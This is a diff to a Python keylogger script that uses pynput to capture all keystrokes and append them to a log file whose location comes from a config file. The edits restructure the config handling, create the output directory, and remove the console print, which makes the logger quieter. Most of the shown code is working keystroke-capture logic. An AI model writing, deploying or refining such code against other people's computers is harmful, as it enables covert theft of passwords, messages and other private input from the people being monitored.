@@ -2,25 +2,25 @@ import json
 from pathlib import Path
 import pynput
 
-SCRIPT_DIR = Path(__file__).parent.resolve()
+SCRIPT_DIR = Path.cwd()
 CONFIG_PATH = SCRIPT_DIR / "config.json"
 
 with open(CONFIG_PATH, "r") as config_file:
     config = json.load(config_file)
 
-log_cfg = config["logging"]
-flush_on_delimiter = log_cfg["flush_on_delimiter"]
-new_line_per_delimiter = log_cfg["new_line_per_delimiter"]
-
-output_dir = Path(log_cfg["output_directory"]) if log_cfg["output_directory"] else SCRIPT_DIR
-log_file_path = output_dir / log_cfg["filename"]
-
+flush_on_delimiter = config["flush_on_delimiter"]
+new_line_per_delimiter = config["new_line_per_delimiter"]
+output_dir = config["output_directory"] 
+if output_dir:
+    Path(output_dir).mkdir(parents=True, exist_ok=True)
+    output_dir=Path(output_dir)
+else: output_dir=SCRIPT_DIR
+    
+log_file_path = output_dir / config["filename"]
 keyboard = pynput.keyboard
 SpecialKey = keyboard.Key
 key_buffer = []
-
 DELIMITER_KEYS = (SpecialKey.backspace, SpecialKey.space, SpecialKey.enter, SpecialKey.esc, SpecialKey.cmd)
-
 KEY_MAP = {
     SpecialKey.space: " ",
     SpecialKey.enter: "\n",
@@ -48,7 +48,6 @@ def convert_key_to_str(key) -> str:
     return f" [{key_name}] "
 
 def save_to_log(text_data: str):
-    print(text_data)
     with open(log_file_path, "a") as file:
         file.write(text_data)
 
@@ -72,3 +71,4 @@ def on_press(key):
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
+
